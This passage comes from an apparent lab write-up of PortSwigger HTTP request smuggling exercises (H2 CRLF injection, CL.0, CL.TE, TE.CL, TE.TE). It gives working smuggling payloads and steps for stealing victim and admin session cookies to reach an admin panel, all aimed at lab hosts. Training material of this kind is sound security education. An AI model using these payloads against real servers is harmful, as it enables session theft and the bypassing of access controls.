- We crafted a `foo` header and used it to **identify chunked encoding** in the request.
- The crafted body contained a partial `search` query, allowing the server to **append the remaining bytes from a victim user's request**.
- This resulted in the victim’s query being stored under our session’s search history.

### HTTP/2 to HTTP/1.1 Downgrade

This lab is unique in that:

- The initial **smuggled request uses HTTP/2**.
- The **back-end server processes requests using HTTP/1.1**.
- This protocol downgrade introduces parsing discrepancies, which we exploit to smuggle headers and body content past the front-end controls.

### Reconnaissance

Before launching the exploit, we explored the application and noticed the search functionality stored historical queries for the logged-in user. This behavior gave us the opportunity to capture **session-specific input from other users**, confirming the site’s vulnerability to **HTTP/2 request smuggling**.

<img width="1096" height="573" alt="image" src="https://github.com/user-attachments/assets/0b32b2a6-e426-44d0-b34a-03a3cca4c344" />

Let’s identify how these historical searches are being stored. Searching the DOM, the only JS script is for the actual lab header. Looking at the cookies, I see I have two.

<img width="629" height="168" alt="image" src="https://github.com/user-attachments/assets/9ad70419-b8e1-4642-874d-f089dcd83f1c" />

If I remove the session cookie the historical searches are no longer reflected back to my screen and I get a new cookie.

<img width="1243" height="764" alt="image" src="https://github.com/user-attachments/assets/b72dbbbf-674a-4f98-a6d9-683ce58d5b17" />


Sending post and get request to repeater from the http history

<img width="1920" height="527" alt="image" src="https://github.com/user-attachments/assets/911d4777-0b9f-4f35-8db2-a0349d2f6e38" />

Try to smuggled request but failed we will  used  other method to smuggled request in http2 header

**Now, hit the [+] at the bottom of the Request Headers section to add a new header. Use a header name of something that will not get processed by the web application.**

<img width="1512" height="618" alt="image" src="https://github.com/user-attachments/assets/4d98dcd0-421f-425b-9814-46f91819fc04" />


For the value it gets a little more tricky. Enter some value and then hit [SHIFT] + [ENTER] to insert the CRLF characters. Manually putting ‘\r\n’ will cause those 4 characters rather than the two special CRLF characters to be embedded. Burp will insert and highlight the characters if they are inserted correctly.

**Note**: this techniques is used to bypass restricion on fronted side

<img width="489" height="665" alt="image" src="https://github.com/user-attachments/assets/fd88199c-6a62-4850-a3d3-7d3c7d0b0423" />

After the CRLF, let’s try to insert a value for Content-Length to see if we can cause any kind of mishandling or queueing of the request. Hit the add and then apply. If you did everything correctly, you should see an information dialog pop at the top of Burp 

<img width="1193" height="526" alt="image" src="https://github.com/user-attachments/assets/4c44a6cf-e04b-4b4d-a9c1-f2b8f84e9ac7" />


Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix

<img width="1437" height="761" alt="image" src="https://github.com/user-attachments/assets/0a95603a-a95b-4627-8a65-a2453147e249" />

Change the body of the request to the following:

0
```http

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x

```

Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:
	○ If you got lucky with your timing, you may see a 404 Not Found response. In this case, refresh the page again and move on to the next step.
	○ If you instead see the search results page, observe that the start of your request is reflected on the page because it was appended to the search=x parameter in the smuggled prefix. In this case, send the request again, but this time wait for 15 seconds before 
           refreshing the page. If you see a 404 response, just refresh the page again.


We can see **800** content-length which will alloacted free space on server and wait for that admin request and display on search result

<img width="1411" height="635" alt="image" src="https://github.com/user-attachments/assets/54ee40e7-9929-4df5-84a7-6fd32ca3d7b1" />

Check the recent searches list. If it contains a GET request, this is the start of the victim user's request and includes their session cookie. If you instead see your own POST request, you refreshed the page too early. Try again until you have successfully stolen the victim's session cookie.

<img width="1113" height="576" alt="image" src="https://github.com/user-attachments/assets/15e01790-ef4a-429c-b92d-46f8f6c955f6" />

Paste thle above session cookie and lab is solved

<img width="1920" height="770" alt="image" src="https://github.com/user-attachments/assets/2fa8b9cf-3ded-4163-96f4-e46a773595d5" />

---

### LAB 11 - HTTP/2 request splitting via CRLF injection

### Lab Description

<img width="867" height="531" alt="image" src="https://github.com/user-attachments/assets/93eed002-94b7-4141-b902-12c463eaea6c" />


### Overview: Smuggling Prohibited Headers via HTTP/2-to-HTTP/1 Conversion

Even if modern web servers implement defenses against traditional HTTP/1 request smuggling techniques (like H2.CL or H2.TE), the **binary nature of HTTP/2** introduces new bypass opportunities.

---

#### Key Concepts

* **HTTP/2 is binary**
  Unlike HTTP/1, which is text-based and uses delimiters like `\r\n` to indicate header boundaries, HTTP/2 uses fixed-length binary fields. This means special character sequences like `\r\n` can be embedded *inside* header values without causing parsing issues in HTTP/2.

* **Header interpretation mismatch**
  A front-end server (speaking HTTP/2) may accept headers like:

  ```
  foo: bar\r\nTransfer-Encoding: chunked
  ```

  Since `\r\n` has no parsing effect in HTTP/2, this is just a header with a complex value.

* **Back-end (HTTP/1) re-interpretation**
  If this request is forwarded to a back-end server over HTTP/1, the embedded `\r\n` will be treated as a real header boundary, causing the back-end to interpret the above as two headers:

  ```
  foo: bar
  Transfer-Encoding: chunked
  ```

  This effectively **smuggles a prohibited header** (`Transfer-Encoding`) past front-end validation.

---

#### Implications

* **Bypasses front-end security checks**
  Front-end servers may strip or block certain headers, but attackers can bypass these restrictions using binary smuggling techniques.

* **Leads to smuggling and desync attacks**
  This discrepancy can lead to classic HTTP request smuggling scenarios, allowing attackers to desynchronize client and server behavior, potentially stealing data or bypassing access controls.

---


### Solution

In this lab we have apply multiple technique to smuggle request but none of them work then we have add full smugle request on foo header of http2 request and smugge request.Basically when server see /r/n/r/n 2 times crlf it will think that this is end of the request.we will take advantage of that  and add smuggle request after 2 crlf and get admin session
 
Additionaly in this lab we are using **http/2** to smuggle request not **http/1** but second smuggle request will be **http/1.1** but initial first request will be http/2

Access the lab and visit admin panel we can see that  only admin can access the admin panel

<img width="1762" height="523" alt="image" src="https://github.com/user-attachments/assets/f98f3e2b-85fc-4888-ac30-072089cf6902" />

Send both red  request to repeater

<img width="1853" height="876" alt="image" src="https://github.com/user-attachments/assets/9522c740-6346-4884-ba58-f0a267a72ea9" />

Try to smuggled request but failed we will  used  other method to smuggled request in **http2** header

**Now, hit the `[+]` at the bottom of the Request Headers section to add a new header. Use a header name of something that will not get processed by the web application.**

<img width="1515" height="581" alt="image" src="https://github.com/user-attachments/assets/f7645510-b225-4259-b304-d2dc5b6566d3" />

For the value it gets a little more tricky. Enter some value and then hit **[SHIFT] + [ENTER]** to insert the CRLF characters. Manually putting ‘\r\n’ will cause those 4 characters rather than the two special CRLF characters to be embedded. Burp will insert and highlight the characters if they are inserted correctly.

**Note:** This techniques is used to bypass restricion on fronted side .The 2 CRLF  `/r/n/r/n` will br treated as end of request and after that GET /404 will  be treated as stored in server for smugglling

You can also used below payload I have used my own technizque of quesue posing

```
Name
foo
Value
bar\r\n\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net

```
<img width="481" height="714" alt="image" src="https://github.com/user-attachments/assets/5fe59d41-2c9a-4dfb-aacf-66cc972b30c7" />

Now sending below  request will excute the first request  of `http/2` and `stored below request` on server  for victim anf when victum request the below 404 response will  be given to him and his request will be stored on server and then attacker send request and victim response will be send to hime which contain session cookie of victim.

<img width="1919" height="906" alt="image" src="https://github.com/user-attachments/assets/47f97a45-d5c7-4f7e-8180-cad35f8bcbe3" />

Wait for around **5 seconds**, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

<img width="1448" height="867" alt="image" src="https://github.com/user-attachments/assets/9b8fcd0f-2460-47bc-ac5f-f85045be69d6" />

Paste  the **above  session  cookie** and **redirection url** to acess admin panel

<img width="1920" height="894" alt="image" src="https://github.com/user-attachments/assets/644d4b14-8a24-4c34-9219-11e57455303a" />

Visit admin panel and delete carlos and lab is solved.

<img width="1890" height="801" alt="image" src="https://github.com/user-attachments/assets/c04b68ef-ef88-44fa-9359-de220be7d7cf" />

> **Note**  
You can also solve the lab using Burp Repeater with the following steps:

1. **Copy the stolen session cookie** and use it to send the following request:
    ```http
    GET /admin HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=STOLEN-SESSION-COOKIE
    ```

2. **Send the request repeatedly** until you receive a `200 OK` response containing the admin panel.

3. In the response, locate the URL to delete Carlos, which should look like:
    ```
    /admin/delete?username=carlos
    ```

4. **Update the path in your request** with the deletion URL:
    ```http
    GET /admin/delete?username=carlos HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=STOLEN-SESSION-COOKIE
    ```

5. **Send the request** to delete Carlos and solve the lab.

---

### LAB 12 - CL.0 request smuggling

### Lab Description

<img width="865" height="376" alt="image" src="https://github.com/user-attachments/assets/179652f9-ab4b-4668-8074-8828fb9ed305" />

### Solution
Here's a clear and concise overview based on your provided content:

---

### **Overview: Browser-Powered Request Smuggling (CL.0)**

**Browser-powered request smuggling** is a powerful technique that lets attackers exploit HTTP desynchronization without needing malformed requests. Instead, attackers can use requests that browsers are capable of sending, making the attack more practical and widely applicable.

One variation is the **CL.0 attack**, where:

* The **front-end** server honors the `Content-Length` header and waits for a full body.
* The **back-end** server **ignores** the `Content-Length` and treats the request as ending at the end of the headers.

This mismatch lets attackers smuggle additional requests into the back-end, which may then affect the next user's interaction — all without needing special headers like `Transfer-Encoding`.

This attack can be tested using tools like **Burp Suite** by grouping a setup request (containing a smuggled prefix) and a follow-up request on a single connection.

If the back-end interprets the body as a new request (e.g., returns a 404 for a `GET` inside the body), it indicates a **CL.0 vulnerability**.

**Key advantages:**

* Works in modern browsers.
* Does not require malformed HTTP/1 headers.
* Can target headers not normally reachable via reflected XSS (like `User-Agent`).
* Enables powerful exploits like session hijacking and client-side desynchronization.

### Solution
In this lab, the front-end is using the content-length and the back-end is ignoring the content-length hence CL.0
To detect a vulnerability like this, we need to find an endpoint that ignores the content-length header. These could be static files, requests to server redirects, request server errors. etc

<img width="1863" height="374" alt="image" src="https://github.com/user-attachments/assets/8a6dedff-f4bb-4b10-9577-0d5dd10bd8e4" />

In this case, we can try use the endpoints highlighted above.
Send to the repeater and change the request method to **POST**. Remember to downgrade the connection to **HTTP/1.1.**

<img width="1106" height="438" alt="image" src="https://github.com/user-attachments/assets/31035c7d-5237-49dd-a8ee-14e5c75ea6f8" />

As Proof of concept, disable the update content length automatically and set a **content-length** that is **higher**. If the server hangs for a few seconds and a read timeout response then the path to static file is vulnerable to a CL.0 vulnerability.

<img width="538" height="348" alt="image" src="https://github.com/user-attachments/assets/49881d39-1625-44bd-9a8c-95cc1a17389a" />

We might as well try to smuggle a resource that does not exist. With this in mind, it is useless to control the content-length, as 
we need the front-end server to forward our entire request.


<img width="1854" height="320" alt="image" src="https://github.com/user-attachments/assets/fa414dc6-995e-4098-9d45-b0988a4dbd6b" />

We get a **404** Not Found,This confirms that the attack works.
Since the goal is to get to admin access,we might as well try /admin path.

<img width="1262" height="782" alt="image" src="https://github.com/user-attachments/assets/cfa020a5-768c-4920-b956-9623705b0d5f" />

Now we get to delete the user Carlos.<

<img width="1353" height="356" alt="image" src="https://github.com/user-attachments/assets/a4b0e55f-7468-4a1e-ac62-5538682adf8f" />

And lab is solved

<img width="1695" height="345" alt="image" src="https://github.com/user-attachments/assets/ad8549bd-d2bb-45b3-bd7b-6253fb315005" />


---

### LAB 13 - HTTP request smuggling, basic CL.TE vulnerability

### Lab Description

<img width="837" height="666" alt="image" src="https://github.com/user-attachments/assets/2eac5b43-b4a2-4d12-936e-b5ae41cfda55" />

### Solution

Firstly when I start the lab  I have seen a static blog post as shown below.

<img width="1733" height="827" alt="image" src="https://github.com/user-attachments/assets/6d94761d-af2e-440d-a258-1e41e3fa9b1a" />

Going to burp http history and sending starting  **/** request to repeater.Intial all request in burp are **HTTP2** ,SO WE HAVE TO CHANGE IT TO **HTTP1.1**

<img width="1913" height="892" alt="image" src="https://github.com/user-attachments/assets/3c3a7a1b-2e0b-48ae-8873-8c637140ca16" />

Manually switch protocols to **http1** in Burp Repeater from the **Request attributes** section of the Inspector panel

AND SECONDLY WE HAVE CHANGE GET REQUEST TO **POST**

<img width="955" height="383" alt="image" src="https://github.com/user-attachments/assets/53f0fe7a-3db6-4048-bcc1-e643a42faa54" />



### Note:
To calculate the `Content-Length` in **bytes**, count each character in the request body, including:
- Spaces
- Newline characters
- Any other visible or encoded characters

**Calculation Tip:**  
Count all characters carefully and ensure the byte count matches the `Content-Length` header to prevent misinterpretation or desynchronization.

---

### Explanation of Key Headers Used:

- **`Connection: keep-alive`**  
  Keeps the connection open to allow multiple requests over the same TCP connection.

- **`Content-Type: application/x-www-form-urlencoded`**  
  Tells the server that the body is in standard form-encoded format.

- **`Content-Length: 6`**  
  Instructs the front-end to read **only 6 bytes** from the body.

- **`Transfer-Encoding: chunked`**  
  Tells the back-end to ignore `Content-Length` and instead read the body until it encounters a `0` (end of chunks).

---

### Payload Structure (CL.TE Attack):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Sending request first time give us **200** response because client side is checking for Content length and server side is looking for 
**Transfer encoding** and when sever side transfer encoding look for **0** and terminate and then **G** will be appended to next same request any request comes to server Like **Gpost** in our case.

<img width="1479" height="683" alt="image" src="https://github.com/user-attachments/assets/ac34822b-02bf-4fd8-aa42-38ceece26f85" />

Second time sending request give us us **GPOST error** because in previous request G is left due to 0 which mean terminated in TE and now G is appneded in next our request of post G added with poast make it GPOST and there is no such method which give  us error or it can be any other reuqest.

<img width="1438" height="683" alt="image" src="https://github.com/user-attachments/assets/e36ae1ee-e5dc-4ef2-8298-d1b9aeafb25c" />

We can also see how too get the content length of text in below image.

<img width="1191" height="292" alt="image" src="https://github.com/user-attachments/assets/b21d9367-fb73-4f3e-b876-42763e09dbe5" />


We can also used below request by removing unnecessary header
payload

```http
POST / HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Transfer-Encoding: chunked

 0 
 G
```

<img width="1477" height="802" alt="image" src="https://github.com/user-attachments/assets/dc659939-07e7-4c35-b34b-8a4af77f6f6a" />


Same sending second time request append G

<img width="1444" height="627" alt="image" src="https://github.com/user-attachments/assets/1979a1c1-220c-404b-ac6c-19d397ac79a7" />


And lab is solved


<img width="1696" height="297" alt="image" src="https://github.com/user-attachments/assets/e71d3e93-b1d9-4938-a304-f553bebff62e" />

We can used anything as append in our paylaod but our lab require was G in below case we have append **l** in sending second time request

<img width="1456" height="711" alt="image" src="https://github.com/user-attachments/assets/a7809257-9496-422e-88a2-8843f54535af" />


### Using extension to find http request smuggling

Sending request to repeater

<img width="1609" height="796" alt="image" src="https://github.com/user-attachments/assets/1681e866-b54f-4f54-a045-9ed8e8c31dad" />

Scanning all scans of http request smuggling


<img width="1797" height="853" alt="image" src="https://github.com/user-attachments/assets/29a71b11-5ec5-4b35-a8b0-bf65808516aa" />

As we can see in flow extension our payload are sending to server

<img width="1811" height="930" alt="image" src="https://github.com/user-attachments/assets/15774f47-6cab-48a1-b7c9-e71940f9f349" />

In the target tab we can see that burp has successfully idendtified the http request smuggling vulnerability

<img width="1920" height="536" alt="image" src="https://github.com/user-attachments/assets/dd363521-60b1-4afc-aa9c-90373871f88d" />

After scan is 45% to 50% complete it also ask to perform **cl te or te cl** to perform more specific type of http smuggling attack

<img width="1411" height="762" alt="image" src="https://github.com/user-attachments/assets/81ccb7c6-1197-464d-98ca-5ffd3607a865" />

After clicking on **cl te** new tab will open which will ask us to lanuch attack

<img width="873" height="608" alt="image" src="https://github.com/user-attachments/assets/710982b4-5f1b-4e70-a9f1-7bb0122489ab" />

---


### LAB 14 - HTTP request smuggling, basic TE.CL vulnerability

### Lab Description

<img width="844" height="663" alt="image" src="https://github.com/user-attachments/assets/696b38b9-891b-41eb-925f-51cf93b4f124" />


### **Overview: TE.CL Vulnerabilities**

**TE.CL** request smuggling occurs when:

* The **front-end** server respects the `Transfer-Encoding: chunked` header.
* The **back-end** server ignores `Transfer-Encoding` and relies on the `Content-Length` header.

---

### **How the Attack Works**

1. You craft a request with **both** headers:

   ```http
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 3
   Transfer-Encoding: chunked

   8
   SMUGGLED
   0

   ```

   * `Transfer-Encoding: chunked` tells the **front-end** to parse the body in chunks.
   * `Content-Length: 3` tells the **back-end** to read only the first 3 bytes of the body.

2. The **front-end** processes it like this:

   * Reads chunk size `8`, then 8 bytes (`SMUGGLED`).
   * Then reads `0` and terminates the request cleanly.

3. The **back-end** sees `Content-Length: 3` and:

   * Reads just `8\r\n` as the body.
   * Leaves `SMUGGLED\r\n0\r\n\r\n` in the buffer as the start of the **next request**.

---

### **Impact**

* The **leftover data** (`SMUGGLED...`) becomes a **ghost request**.
* This can:

  * Hijack user sessions.
  * Poison cache.
  * Trigger XSS or CSRF.
  * Enable internal access.

---

### Solution


In this lab client side is looking for **transfer encoding** and server side is looking for **content length**

First we click on the lab and below page is shown up

<img width="1911" height="699" alt="image" src="https://github.com/user-attachments/assets/fd07fc62-af9c-4c5a-84d8-45689b9ea4a8" />

Intercept the root request and send to repeater.

<img width="1798" height="913" alt="image" src="https://github.com/user-attachments/assets/c5f6fc8b-f3d3-4274-9c69-f203e867dbf8" />

In this case, changing the GET to a POST gives us back a 200 so we can work with this page. I additionally added in a POST body of ‘x=1’ just to ensure passing content would not cause an issue.

<img width="1459" height="843" alt="image" src="https://github.com/user-attachments/assets/f26bd4d4-fc81-47d3-b83e-23e3871a77cc" />

Change request to **http/1.1** in the inspector tab

<img width="1918" height="777" alt="image" src="https://github.com/user-attachments/assets/60ead9fe-1c53-4a3b-9c67-8d70046b04a5" />

The payload we used is

```http

Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded
Content-Length:4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```
 We can also remove uncessay header but I donot do it we you want to remove unnecessary header used below request

<img width="608" height="418" alt="image" src="https://github.com/user-attachments/assets/29e1a863-88df-4a22-9cea-4f2928eaf747" />

Sending first time request will gives us 200 response and store smuggled request of **gpost** for another request which will come next to server

<img width="1468" height="871" alt="image" src="https://github.com/user-attachments/assets/ef430a6b-7a32-4da6-a64a-e303a6e19cc0" />


**Note**: The Rectangle in request are used tell content-length used by **/r \n 5c** create 4 byte length in content length one character is equal to one byte 

After we send second request GPOTS error  come whcoh menaq server has succesully smuggled request

<img width="1331" height="541" alt="image" src="https://github.com/user-attachments/assets/907a4afa-6234-4e51-9522-77803b792de2" />


After sending succesfully gpost request lab is solved.


<img width="1617" height="592" alt="image" src="https://github.com/user-attachments/assets/23fd4296-5df4-4f50-8db2-92ac2e62822f" />

---

### LAB 15 - HTTP request smuggling, obfuscating the TE header

### Lab Description

<img width="867" height="701" alt="image" src="https://github.com/user-attachments/assets/52b8eaa4-dfb8-415a-b89f-c0fceda81326" />



### **Overview: TE.TE Behavior – Obfuscating the `Transfer-Encoding` Header**

**TE.TE vulnerabilities** arise when:

* Both **front-end** and **back-end** servers **support** the `Transfer-Encoding` header.
* However, **only one** of them processes it due to **obfuscation** in the header.

---

### **Key Concept**

By **obfuscating** the `Transfer-Encoding` header (e.g., `Transfer-Encoding : chunked`, `Transfer-Encoding\t:\tchunked`, or with mixed casing or line folding), you can:

* Trick **one server** (front-end or back-end) into **ignoring** the header,
* While the **other** still **parses it correctly**.

This creates a **desynchronization** between both servers' interpretations of the HTTP request.

---

### **Common Obfuscation Techniques**

<img width="757" height="513" alt="image" src="https://github.com/user-attachments/assets/8641ea8b-d571-4984-8322-b0bd9d3665e6" />


### Solution

The goal of the lab is to once again cause a GPOST request. This is going to be very similar to the TE.CL lab, but we’ll have to mess with the headers to get the backend to process the request using Content-Length rather than transfer encoding.

After starting lab below page will show up on the screen 

<img width="1228" height="598" alt="image" src="https://github.com/user-attachments/assets/29dc7f48-8213-4a2d-952b-dae5c70810af" />

 Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the GET request to `/` and send that to repeater.

<img width="1815" height="838" alt="image" src="https://github.com/user-attachments/assets/86e867ae-e807-4da4-ad86-fdfc1099ff17" />

We need to be able to send a request body if the page has the potential to be vulnerable. In Repeater, change the request from a **GET** to a **POST** also change **http/1.1** to request and resend.


 We get a 200 and it accepts a payload in the body so we can move on to the next step.

<img width="1335" height="734" alt="image" src="https://github.com/user-attachments/assets/c08c87bf-78dc-4334-989c-0f066b92f69e" />

I let Burp set the **Content-Length** for me. With both sets of headers present and the payload constructed to conform to **Transfer-Encoding: chunked**, the request is processed successfully and we receive a 200 response.

Here’s the step where we would test for CL.TE and TE.CL vulnerabilities. Force setting the Content-Length to an incorrect value (either too long or too short) always yields a 200 response.
In the below request we have remove unnecessary header .

<img width="1166" height="650" alt="image" src="https://github.com/user-attachments/assets/6657ab37-9717-4012-812c-301f8e24dd92" />

This means we can assume both the backend and frontend are conforming to the HTTP specification are both are honoring transfer encoding. If I do misconfigure the payload, I immediately get a 500 error.


<img width="1058" height="540" alt="image" src="https://github.com/user-attachments/assets/6f0cd307-3fa8-4c88-8064-44b4756ecbbc" />

Here is now where we test if we can get the web application to ignore the Transfer-Encoding header and fall back to Content-Length. By placing a second Transfer-Encoding header, it’s possible a part of the web application infrastructure will mishandle the request.

Double TE header with multiple submits

<img width="1064" height="661" alt="image" src="https://github.com/user-attachments/assets/994ff75a-ba1a-484a-b7f9-5971a5462b96" />

200 response, so now we change the TE header to have an odd value:


<img width="1054" height="510" alt="image" src="https://github.com/user-attachments/assets/0dbad862-96ec-41ad-aa11-2714df3f6931" />


**500 response.** This might mean that either the frontend or backend honors the first TE header it encounters and does not fall back to Content-Length. Here is where we try reordering the headers.

<img width="1065" height="643" alt="image" src="https://github.com/user-attachments/assets/988f9195-a331-4776-83aa-1588dcff0177" />

This hangs for a very long time and then returns a 500. This is great! I still have a Content-Length of 300 in the payload. Let’s set it to something less than the length of the provided payload and try multiple submits:

<img width="1027" height="570" alt="image" src="https://github.com/user-attachments/assets/0c9e0262-6ad0-440d-a26e-c9b786d8392a" />

**Bingo!**  
It appears that the **frontend** is handling the request according to the **first `Transfer-Encoding` header**. The **backend**, however, attempts to handle the request based on the **second `Transfer-Encoding` header**, which contains an invalid value. As a result, the backend **falls back to processing the request using the `Content-Length` header**.

Now, the goal is to **get the HTTP verb to become `GPOST`** by smuggling part of a request.

---

### Step 7:
With the obfuscated `Transfer-Encoding` header, the vulnerability becomes a **TE.CL vulnerability**, just like in the previous lab.

---

### Note:
- The **red triangle icon** in Burp Suite (when selecting the request body) shows the **Content-Length** in the **top-right panel**. This helps confirm your body size matches the specified length.
- The **403 response** is the result of the **second request** being smuggled.  
- The **first request** stores part of the payload and returns **200 OK**.  
- When the **second request** is sent, the **leftover data from the first request** is interpreted as a new request, resulting in a malformed HTTP verb like **`GPOST`** and leading to a **403 error**.

<img width="1295" height="448" alt="image" src="https://github.com/user-attachments/assets/1151ea47-ec16-4777-9b93-5d0c527b1eea" />

## Final Exploit Explanation

With the **Content-Length set to 4**, the **backend** processes the request payload `'5c\r\n'` and **leaves the remaining part of the payload** for the next incoming request.

This leftover data includes the **malformed HTTP verb `GPOST`**, which is queued.

Since the **Content-Length in the GPOST request** is longer than the actual payload, the backend waits for more data to complete the request.

When the **next request is sent**, the server **releases the queued GPOST request**, resulting in the exploit being triggered and **the lab being solved**.

<img width="1633" height="342" alt="image" src="https://github.com/user-attachments/assets/7a3320ae-bba0-4da4-a47b-a13a3821543a" />

---


